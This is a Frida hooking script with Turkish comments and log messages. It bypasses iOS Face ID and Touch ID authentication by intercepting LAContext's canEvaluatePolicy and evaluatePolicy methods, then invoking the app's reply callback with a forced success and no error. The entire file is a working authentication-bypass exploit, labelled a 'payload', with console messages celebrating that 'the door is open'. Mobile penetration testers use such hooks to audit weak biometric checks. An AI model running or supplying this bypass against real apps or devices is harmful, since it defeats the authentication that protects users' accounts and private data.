/**
 * Sentinel Hook - Biometric Bypass Payload
 * Phase 2.1: Biyometrik doğrulama fonksiyonunu havada yakalar ve
 * fiziksel eşleşme gerektirmeden 'TRUE' (başarılı) döner.
 */

if (ObjC.available) {
    console.log("[🌟] SENTINEL HOOK YÜKLENİYOR: Hedef LAContext (iOS Face ID / Touch ID)");

    var LAContext = ObjC.classes.LAContext;
    var targetSensorMethod = "- evaluatePolicy:localizedReason:reply:";
    var canEvaluateMethod = "- canEvaluatePolicy:error:";

    console.log("[*] Hedef API Hook Noktası: " + targetSensorMethod);
    console.log("[*] Ön-Kontrol Hook Noktası: " + canEvaluateMethod);

    // 1. ÖN KONTROLÜ (canEvaluatePolicy) BYPASS ET
    Interceptor.attach(LAContext[canEvaluateMethod].implementation, {
        onLeave: function(retval) {
            console.log("\n[💥] SENTINEL: canEvaluatePolicy çağrıldı. Cihaz FaceID desteklemiyor olsa bile DOĞRU (1) dönüyoruz!");
            retval.replace(1); // true döndür (1 = YES)
        }
    });

    // 2. ASIL DOĞRULAMAYI BYPASS ET
    Interceptor.attach(LAContext[targetSensorMethod].implementation, {
        
        onEnter: function(args) {
            console.log("\n[💥] SENTINEL YAKALADI: Uygulama biyometrik doğrulama istiyor!");
            
            // args[0] = self, args[1] = selector, args[2] = policy
            var reasonMessage = new ObjC.Object(args[3]).toString();
            console.log("   [Hedef Uyarı]: " + reasonMessage);
            console.log("   [Aksiyon]: Kullanıcıya Face ID promp'u DELEGE EDİLMEYECEK.");

            // args[4] içerisindeki "reply" callback fonksiyonudur (Swift Block Object)
            // Bu callback'i saklıyoruz ki bunu manipüle edebilelim.
            this.replyBlock = args[4];
        },
        
        onLeave: function(retval) {
            console.log("[*] Sentinel kısa devre yapıyor...");
            
            // Eğer block (args[4]) null değilse, kendi "sahte başarımızı" yollayacağız
            if (!this.replyBlock.isNull()) {
                
                // Swift Block objeleri bellek üzerinde belirli bir signature ile çağrılırlar:
                // Signature: void replyBlock(BOOL success, NSError *error)
                var block = new ObjC.Block(this.replyBlock);
                
                // Uygulamanın beklediği Block çağrısını kendi kontrolümüzde gerçekleştiriyoruz:
                // Başarı (Success) -> 1 (true)
                // Hata (Error) -> null (nil)
                console.log("[🔥] BYPASS: 'BAŞARILI' (True) sinyali enjekte ediliyor!");
                
                // Block fonksiyonunu çalıştır
                try {
                    block.implementation(1, null);
                    console.log("[✅] GÖREV TAMAMLANDI! Kapı açıldı.");
                } catch (e) {
                    console.log("[!] Block çalıştırma hatası: " + e);
                }
            }
        }
    });

} else {
    console.log("[-] HATA: Objective-C Runtime bulunamadı.");
}
